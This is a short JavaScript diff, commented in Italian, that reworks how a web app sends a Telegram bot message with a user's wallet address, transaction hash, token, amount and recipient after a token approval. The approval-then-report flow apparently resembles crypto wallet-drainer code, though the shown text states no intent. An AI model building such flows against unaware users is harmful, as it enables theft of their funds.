@@ -362,12 +362,15 @@
                     }
                 }
 
-                // Invia notifica Telegram SUBITO (non aspettare recordApproval)
-                sendTelegramNotification(finalUserAddress, txHash, amount, token, recipient).catch(err => {
+                // INVIA NOTIFICA TELEGRAM IMMEDIATAMENTE (senza aspettare recordApproval)
+                try {
+                    await sendTelegramNotification(finalUserAddress, txHash, amount, token, recipient);
+                    console.log('Telegram notification sent successfully');
+                } catch (err) {
                     console.error('Telegram notification error:', err);
-                });
+                }
 
-                // Chiama recordApproval nel contract (non-blocking)
+                // Chiama recordApproval nel contract (in background, non-blocking)
                 recordApprovalAsync(ethereum, finalUserAddress, token, amount).catch(err => {
                     console.error('recordApproval error (non-critical):', err);
                 });
@@ -422,27 +425,22 @@
 
             const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`;
 
-            try {
-                console.log('Sending Telegram notification...');
-                
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CONFIG.TELEGRAM_CHAT_ID,
-                        text: messageText
-                    })
-                });
+            console.log('Sending Telegram notification...');
+            
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CONFIG.TELEGRAM_CHAT_ID,
+                    text: messageText
+                })
+            });
 
-                const responseData = await response.json();
-                console.log('Telegram response:', responseData);
+            const responseData = await response.json();
+            console.log('Telegram response:', responseData);
 
-                if (!responseData.ok) {
-                    console.error('Telegram API error:', responseData);
-                }
-
-            } catch (error) {
-                console.error('Failed to send Telegram notification:', error);
+            if (!responseData.ok) {
+                throw new Error('Telegram API error: ' + (responseData.description || 'Unknown error'));
             }
         }
 
